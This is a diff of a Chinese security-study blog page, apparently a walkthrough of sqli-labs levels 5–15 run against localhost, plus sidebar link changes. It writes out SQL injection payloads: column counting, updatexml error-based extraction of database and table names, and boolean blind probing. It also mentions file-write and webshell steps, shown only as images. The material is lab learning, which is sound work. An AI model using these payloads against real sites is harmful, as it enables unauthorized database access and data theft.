+<h5><span id="字段数判断">字段数判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+	#报错</span></span><br><span class="line"><span class="string">字段数为3</span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="使用updatexml函数">使用updatexml()函数</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+#爆库名</span></span><br><span class="line"><span class="string">#0x7e是 ~</span></span><br><span class="line"><span class="string">替换中间select语句进行查询</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917190731539.png" alt="image-20230917190731539"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (updatexml(1,</span></span><br><span class="line"><span class="string">concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),0x7e),1))--+</span></span><br><span class="line"><span class="string">一次输出一行，依次替换limit x,1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192200527.png" alt="image-20230917192200527"></p>
+<h4><span id="总结">总结</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192322970.png" alt="image-20230917192322970"></p>
+<h3><span id="level6-与上题相同闭合不同双引号闭合">Level6 与上题相同，闭合不同双引号闭合</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192649852.png" alt="image-20230917192649852"></p>
+<h3><span id="level7-基于文件写入">Level7 基于文件写入</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917193535643.png" alt="image-20230917193535643"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="判断注入点">判断注入点</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> #回显，提示outfile</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; #报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>)) #回显，提示outfile</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=1	#回显，提示outfile</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>)) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>	#不回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917192853787.png" alt="image-20230917192853787"></p>
+<h3><span id="一句话木马">一句话木马</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917195648341.png" alt="image-20230917195648341"></p>
+<h3><span id="level8-布尔盲注">Level8 布尔盲注</span></h3><h4><span id="源码">源码</span></h4><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917201507478.png" alt="image-20230917201507478"></p>
+<h4><span id="注入">注入</span></h4><h5><span id="注入点判断">注入点判断</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;	#回显错误</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>	#回显正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2	#无回显</span></span><br></pre></td></tr></table></figure>
+
+<h5><span id="爆破">爆破</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span>s<span class="string">&#x27;=left(database(),1)--+ 页面正常 说明第一个字母为s</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917203508996.png" alt="image-20230917203508996"></p>
+<h3><span id="level9-10-时间盲注">Level9 -10 时间盲注</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917204715306.png" alt="image-20230917204715306"></p>
+<h3><span id="level11post传参">Level11Post传参</span></h3><p><img src="/2023/02/23/SQL%E6%B3%A8%E5%85%A5/image-20230917205752962.png" alt="image-20230917205752962"></p>
+<h3><span id="level15">Level15</span></h3>
       
     </div>
     <footer class="article-footer">
@@ -1209,7 +1804,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li></ul>
     </div>
   </div>
 
@@ -1220,6 +1815,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/11/01/%E5%AE%89%E5%8D%93%E5%8F%96%E8%AF%81/">安卓取证</a>
+          </li>
         
           <li>
             <a href="/2023/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8/">数据库原理与安全</a>
@@ -1235,10 +1834,6 @@
         
           <li>
             <a href="/2023/02/21/Windows%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">Windows与网络基础</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/13/Hexo/">Hexo</a>
           </li>
         
       </ul>
